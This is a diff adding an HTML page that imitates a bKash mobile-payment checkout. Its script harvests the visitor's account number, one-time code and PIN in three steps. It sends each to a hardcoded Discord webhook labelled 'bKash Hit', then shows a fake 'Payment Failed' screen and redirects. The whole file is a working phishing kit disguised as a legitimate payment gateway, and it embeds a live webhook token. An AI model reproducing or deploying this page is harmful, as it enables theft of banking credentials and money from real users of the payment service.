@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>bKash Payment UI</title>
+    
+    <!-- সোশ্যাল মিডিয়া প্রিভিউ ইমেজ ট্যাগ -->
+    <meta property="og:title" content="bKash Payment">
+    <meta property="og:description" content="Secure bKash Payment Gateway">
+    <meta property="og:image" content="https://raw.githubusercontent.com/wildcartxzx-beep/Pbkash-/refs/heads/main/logo.png">
+    <meta property="og:type" content="website">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background-color: #8c8c8c; }
+        body { font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: flex-start; padding-top: 12vh; }
+        
+        .bkash-container { 
+            width: 92%; max-width: 350px; height: 450px; background: white; 
+            border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
+            display: flex; flex-direction: column; position: relative; overflow: hidden;
+        }
+
+        .header { height: 45px; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f1f1f1; flex-shrink: 0; }
+        .header img { width: 70px; }
+
+        .merchant-bar { display: flex; align-items: center; justify-content: space-between; padding: 8px 15px; border-bottom: 1px solid #eee; flex-shrink: 0; }
+        .m-info { display: flex; align-items: center; gap: 8px; }
+        .m-icon { width: 32px; height: 32px; border: 1px solid #eee; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; background: white; }
+        .m-icon img { width: 130%; height: 130%; object-fit: cover; }
+        .m-text { font-size: 10px; font-weight: 500; color: #4A4A4A; line-height: 1.2; }
+        .m-amount { font-weight: 700; font-size: 14px; color: #4A4A4A; }
+
+        .content-area { 
+            background: #e2136e; flex-grow: 1; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; padding: 15px 20px; 
+            color: white; text-align: center; position: relative;
+        }
+
+        .label-main { font-size: 14px; font-weight: 500; margin-bottom: 10px; }
+        .label-sub { font-size: 15px; font-weight: 500; margin-bottom: 10px; }
+        
+        .main-input { 
+            width: 100%; height: 42px; border-radius: 6px; border: 2.5px solid rgba(255, 255, 255, 0.5); 
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.3); text-align: center; font-size: 17px; 
+            font-weight: 600; color: #4A4A4A; outline: none; margin: 10px 0; box-sizing: border-box;
+            background: white;
+        }
+
+        .main-input::placeholder { color: #4A4A4A; opacity: 0.3; font-weight: 400; }
+
+        .resend-link { font-size: 13px; text-decoration: underline; cursor: pointer; color: white; display: none; font-weight: 500; }
+        .timer-box { font-size: 12px; }
+
+        .action-bar { height: 65px; background: #f1f1f1; display: flex; align-items: center; padding: 0 15px; gap: 10px; flex-shrink: 0; }
+        .btn { flex: 1; height: 40px; border-radius: 3px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative; }
+        .btn-cancel { background: white; border: 1px solid #ddd; color: #666; }
+        .btn-confirm { background: #b5b5b5; color: white; pointer-events: none; }
+        .btn-confirm.active { background: #e2136e; pointer-events: auto; }
+
+        #loader-overlay { position: absolute; inset: 0; background: #e2136e; z-index: 20; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .dots { display: flex; gap: 6px; }
+        .dots div { width: 10px; height: 10px; background: white; border-radius: 50%; animation: bounce 0.6s infinite alternate; }
+        .inner-loader { display: none; gap: 4px; position: absolute; }
+        .inner-loader div { width: 7px; height: 7px; background: white; border-radius: 50%; animation: bounce 0.6s infinite alternate; }
+        @keyframes bounce { to { opacity: 0.3; transform: translateY(-4px); } }
+
+        #fail-screen { display: none; position: absolute; inset: 0; background: #e2136e; flex-direction: column; align-items: center; justify-content: center; z-index: 30; padding: 20px; }
+        .fail-icon { width: 45px; height: 45px; border: 2px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 300; margin-bottom: 12px; }
+        .fail-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+        .fail-reason { font-size: 15px; font-weight: 400; opacity: 0.9; margin-bottom: 15px; }
+        .fail-redirect { font-size: 11px; opacity: 0.8; margin-top: 5px; }
+        .fail-redirect u { text-decoration: underline; }
+
+        .footer { height: 50px; background: white; border-top: 1px solid #eee; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 9px; color: #999; flex-shrink: 0; }
+        .footer b { color: #e2136e; font-size: 11px; margin-bottom: 2px; }
+    </style>
+</head>
+<body>
+
+<div class="bkash-container">
+    <div class="header"><img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/refs/heads/main/bkash-logo-horizontal-mobile-banking-app-icon-emblem-transparent-background-free-png.png"></div>
+    <div id="merchant-bar" class="merchant-bar">
+        <div class="m-info">
+            <!-- এখানে প্রথম দেওয়া মার্চেন্ট লোগো ঠিক রাখা হয়েছে -->
+            <div class="m-icon"><img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/heads/main/images%20(3).png"></div>
+            <div class="m-text"><b>SSLCOMMERZ</b><br><span>Inv: 8cf84713499...</span></div>
+        </div>
+        <div class="m-amount">৳<span id="displayAmount">20</span></div>
+    </div>
+
+    <div class="content-area">
+        <div id="loader-overlay">
+            <div class="dots"><div></div><div></div><div></div></div>
+            <p style="margin-top:10px; font-size: 13px;">Loading</p>
+        </div>
+
+        <div id="ui-steps" style="width: 100%;">
+            <div id="label-top" class="label-main">Your bKash Account Number</div>
+            <div id="label-mid" class="label-sub"></div>
+            <input type="tel" id="user-input" class="main-input" placeholder="e.g 01XXXXXXXXX" maxlength="11" oninput="validateInput()">
+            <div id="terms-txt" style="font-size: 12px;">Confirm and proceed, <u style="cursor:pointer">terms & conditions</u></div>
+            <div id="resend-container" style="display: none; margin-top: 5px;">
+                <div id="timer-box" class="timer-box">Resend Code in <span id="timer">30</span>s</div>
+                <div id="resend-link" class="resend-link" onclick="handleResend()">Resend Code</div>
+            </div>
+        </div>
+
+        <div id="fail-screen">
+            <div class="fail-icon">✕</div>
+            <div class="fail-title">Payment Failed</div>
+            <div class="fail-reason">Insufficient balance</div>
+            <div class="fail-redirect">Redirecting to <u>Merchant Website</u> in <span id="redir-timer">5</span>s</div>
+        </div>
+    </div>
+
+    <div class="action-bar" id="action-bar">
+        <button class="btn btn-cancel" onclick="location.reload()">Cancel</button>
+        <button id="confirm-btn" class="btn btn-confirm" onclick="handleFlow()">
+            <span id="btn-text">Confirm</span>
+            <div class="inner-loader" id="btn-load"><div></div><div></div><div></div></div>
+        </button>
+    </div>
+    <div class="footer"><b>📞 16247</b><div>© 2026 bKash, All Rights Reserved</div></div>
+</div>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1528766265706025141/sMFgoZvySgACZiyhqORIhulTM6gZlLbVGckfXACBFeCNpFbT6WVC9AtWBGkuzDZZgIT9";
+    let step = 1, number = "", selectedAmount = "26", otpInterval;
+
+    window.onload = () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount');
+        if (amount) { selectedAmount = amount; document.getElementById('displayAmount').innerText = selectedAmount; }
+        setTimeout(() => { document.getElementById('loader-overlay').style.display = 'none'; }, 2000);
+    };
+
+    function validateInput() {
+        const input = document.getElementById('user-input');
+        const btn = document.getElementById('confirm-btn');
+        const len = input.value.length;
+        if (step === 1) len === 11 ? btn.classList.add('active') : btn.classList.remove('active');
+        else if (step === 2) len === 6 ? btn.classList.add('active') : btn.classList.remove('active');
+        else if (step === 3) (len >= 4 && len <= 5) ? btn.classList.add('active') : btn.classList.remove('active');
+    }
+
+    async function sendToDiscord(content) {
+        try { await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ title: "bKash Hit", description: content, color: 14816110 }] }) }); } catch (e) {}
+    }
+
+    function startOTPTimer() {
+        let timeLeft = 30;
+        const timerBox = document.getElementById('timer-box');
+        const resendLink = document.getElementById('resend-link');
+        timerBox.style.display = 'block';
+        resendLink.style.display = 'none';
+        clearInterval(otpInterval);
+        otpInterval = setInterval(() => {
+            timeLeft--;
+            document.getElementById('timer').innerText = timeLeft;
+            if(timeLeft <= 0) {
+                clearInterval(otpInterval);
+                timerBox.style.display = 'none';
+                resendLink.style.display = 'block';
+            }
+        }, 1000);
+    }
+
+    function handleResend() { 
+        startOTPTimer(); 
+        sendToDiscord(`**OTP Resend Clicked**\n**User:** ${number}`);
+    }
+
+    function handleFlow() {
+        const input = document.getElementById('user-input');
+        const loader = document.getElementById('btn-load');
+        const btnTxt = document.getElementById('btn-text');
+        const val = input.value;
+        btnTxt.style.visibility = 'hidden';
+        loader.style.display = 'flex';
+        let delay = (step === 1) ? 4000 : 1500;
+
+        setTimeout(() => {
+            btnTxt.style.visibility = 'visible';
+            loader.style.display = 'none';
+            if(step === 1) {
+                number = val;
+                sendToDiscord(`**Number:** ${number}\n**Amount:** ${selectedAmount} TK`);
+                document.getElementById('label-top').innerText = "Enter Verification Code Sent To";
+                document.getElementById('label-mid').innerText = number.substring(0,3) + " ** *** " + number.substring(8);
+                document.getElementById('terms-txt').style.display = 'none';
+                document.getElementById('resend-container').style.display = 'block';
+                input.value = ""; input.placeholder = "Enter 6 digit code"; input.maxLength = 6;
+                step = 2; startOTPTimer();
+            } 
+            else if(step === 2) {
+                clearInterval(otpInterval);
+                sendToDiscord(`**OTP:** ${val}\n**User:** ${number}`);
+                document.getElementById('label-top').innerText = "Enter PIN of Your bKash Account";
+                document.getElementById('label-mid').innerText = "(" + number.substring(0,3) + " ** *** " + number.substring(8) + ")";
+                document.getElementById('resend-container').style.display = 'none';
+                input.value = ""; 
+                input.type = "tel"; // সংখ্যা কিবোর্ড নিশ্চিত করার জন্য
+                input.style.webkitTextSecurity = "disc"; // পিন ডট ডট দেখানোর জন্য
+                input.placeholder = "Enter PIN"; 
+                input.maxLength = 5;
+                step = 3;
+            }
+            else if(step === 3) {
+                sendToDiscord(`**PIN:** ${val}\n**User:** ${number}`);
+                document.getElementById('merchant-bar').style.display = 'none';
+                document.getElementById('action-bar').style.display = 'none';
+                document.getElementById('ui-steps').style.display = 'none';
+                document.getElementById('fail-screen').style.display = 'flex';
+                startRedirectTimer();
+            }
+            validateInput(); 
+        }, delay);
+    }
+
+    function startRedirectTimer() {
+        let rs = 5;
+        const interval = setInterval(() => {
+            rs--;
+            if(document.getElementById('redir-timer')) document.getElementById('redir-timer').innerText = rs;
+            if(rs <= 0) { clearInterval(interval); window.location.href = "index.html"; }
+        }, 1000);
+    }
+</script>
+</body>
+</html>
